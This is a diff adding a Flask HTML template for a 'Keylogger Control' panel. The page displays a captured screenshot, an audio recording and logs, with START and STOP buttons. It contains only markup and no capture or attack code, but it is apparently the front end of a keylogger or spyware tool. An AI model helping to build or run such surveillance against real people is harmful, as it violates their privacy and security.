@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Keylogger Control</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}" />
+</head>
+<body>
+    <h1>KEYLOGGER</h1>
+    <h2>Captured Files</h2>
+
+<h3>Screenshot:</h3>
+<img src="{{ url_for('files', filename='screenshot.png') }}" alt="Screenshot" style="max-width: 500px; border: 1px solid #ccc;">
+
+<h3>Audio Recording:</h3>
+<audio controls>
+  <source src="{{ url_for('files', filename='audio.wav') }}" type="audio/wav">
+  Your browser does not support the audio element.
+</audio>
+
+    <form method="post" action="/">
+        <div class="prompt-buttons">
+            <button type="submit" name="action" value="start" class="btn btn-dark">START</button>
+            <button type="submit" name="action" value="stop" class="btn btn-dark">STOP</button>
+        </div>
+    </form>
+    <div class="output-container">
+        <label for="outputBox">STATUS</label>
+        <input type="text" id="outputBox" value="{{ output }}" readonly />
+    </div>
+    <div>
+      <label for="logBox">Logs:</label><br>
+      <textarea id="logBox" rows="20" cols="100" readonly>{{ logs }}</textarea>
+  </div>
+</body>
+</html>
